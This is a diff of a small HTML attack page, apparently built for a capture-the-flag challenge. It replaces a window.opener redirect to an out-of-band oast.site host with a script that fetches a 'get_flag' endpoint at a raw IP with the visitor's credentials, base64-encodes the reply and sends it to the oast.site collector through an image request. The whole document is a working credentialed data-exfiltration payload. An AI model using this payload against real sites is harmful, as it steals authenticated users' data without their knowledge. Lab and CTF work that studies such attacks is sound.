@@ -2,9 +2,11 @@
 <html>
 <body>
 <script>
-if (window.opener) {
-    window.opener.location = 'http://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site';
-}
+fetch('http://34.134.162.213:17001/get_flag', { credentials: 'include' })
+  .then(r => r.text())
+  .then(data => {
+    new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(data);
+  });
 </script>
 </body>
 </html>
